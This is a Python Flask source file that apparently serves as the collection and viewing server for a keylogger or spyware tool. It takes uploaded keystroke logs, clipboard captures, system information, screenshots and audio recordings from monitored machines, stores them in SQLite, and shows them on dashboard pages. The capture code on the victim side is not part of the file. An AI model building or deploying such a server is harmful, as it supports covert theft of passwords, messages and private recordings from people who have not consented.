from flask import Flask, render_template, request
from werkzeug.utils import secure_filename
import os
import sqlite3
from datetime import datetime

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'static/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
DB_FILE = 'database.db'

# -------------- Database Setup --------------
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS keystrokes (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        timestamp TEXT,
                        content TEXT
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS clipboard (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        timestamp TEXT,
                        content TEXT
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS uploads (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        filename TEXT,
                        filetype TEXT,
                        timestamp TEXT
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS system_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                content TEXT
            )''')
        conn.commit()

init_db()

# -------------- Routes --------------
@app.route("/")
@app.route("/home")
def home():
    return render_template("home.html")

@app.route("/upload", methods=["POST"])
def upload():
    if 'file' not in request.files:
        return "No file part", 400

    file = request.files['file']
    if file.filename == '':
        return "No selected file", 400

    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ext = os.path.splitext(filename)[1].lower()

    if filename == 'key_log.txt':
        with open(filepath, 'r', encoding='utf-8') as f, sqlite3.connect(DB_FILE) as conn:
            c = conn.cursor()
            for line in f:
                if line.strip():
                    ts = line[1:20]  # Extract timestamp inside brackets [YYYY-MM-DD HH:MM:SS]
                    content = line[21:].strip()
                    c.execute("INSERT INTO keystrokes (timestamp, content) VALUES (?, ?)", (ts, content))
            conn.commit()

    elif filename == 'systeminfo.txt':
        print(f"Processing systeminfo.txt upload at {timestamp}")  # Debug print
        with open(filepath, 'r', encoding='utf-8') as f, sqlite3.connect(DB_FILE) as conn:
            content = f.read().strip()
            c = conn.cursor()
            c.execute("INSERT INTO system_info (timestamp, content) VALUES (?, ?)", (timestamp, content))
            conn.commit()

    elif filename == 'clipboard.txt':
        with open(filepath, 'r', encoding='utf-8') as f, sqlite3.connect(DB_FILE) as conn:
            lines = f.readlines()
            if len(lines) >= 2:
                ts = lines[0].strip().strip("[]")
                content = ''.join(lines[1:]).strip()
                c = conn.cursor()
                c.execute("INSERT INTO clipboard (timestamp, content) VALUES (?, ?)", (ts, content))
                conn.commit()

    elif ext in ['.png', '.jpg', '.jpeg']:
        with sqlite3.connect(DB_FILE) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO uploads (filename, filetype, timestamp) VALUES (?, ?, ?)", (filename, 'image', timestamp))
            conn.commit()

    elif ext == '.wav':
        with sqlite3.connect(DB_FILE) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO uploads (filename, filetype, timestamp) VALUES (?, ?, ?)", (filename, 'audio', timestamp))
            conn.commit()

    return "File uploaded successfully"

@app.route("/keystroke")
def keystroke():
    with sqlite3.connect(DB_FILE) as conn:
        keystrokes = conn.execute("SELECT timestamp, content FROM keystrokes ORDER BY id DESC").fetchall()
    keystrokes_str = '\n'.join(f"[{ts}]   {content}" for ts, content in keystrokes)
    return render_template("keystroke.html", keystrokes=keystrokes_str)

@app.route("/clipboard")
def clipboard():
    with sqlite3.connect(DB_FILE) as conn:
        clips = conn.execute("SELECT timestamp, content FROM clipboard ORDER BY id DESC").fetchall()
    return render_template("clipboard.html", clips=clips)

@app.route("/screenshot")
def screenshot():
    with sqlite3.connect(DB_FILE) as conn:
        screenshots = conn.execute("SELECT filename FROM uploads WHERE filetype='image' ORDER BY id DESC").fetchall()
    screenshots = [row[0] for row in screenshots]
    return render_template("screenshot.html", screenshots=screenshots)

@app.route("/audio")
def audio():
    with sqlite3.connect(DB_FILE) as conn:
        audios = conn.execute("SELECT filename FROM uploads WHERE filetype='audio' ORDER BY id DESC").fetchall()
    audios = [row[0] for row in audios]
    return render_template("audio.html", audios=audios)

@app.route("/systeminfo")
def systeminfo():
    with sqlite3.connect(DB_FILE) as conn:
        data = conn.execute("SELECT timestamp, content FROM system_info ORDER BY id DESC LIMIT 1").fetchone()
    if data:
        timestamp, content = data
        return render_template("systeminfo.html", system_info=content, timestamp=timestamp)
    else:
        return render_template("systeminfo.html", system_info="No system info uploaded yet.", timestamp=None)

if __name__ == "__main__":
    app.run(debug=True)
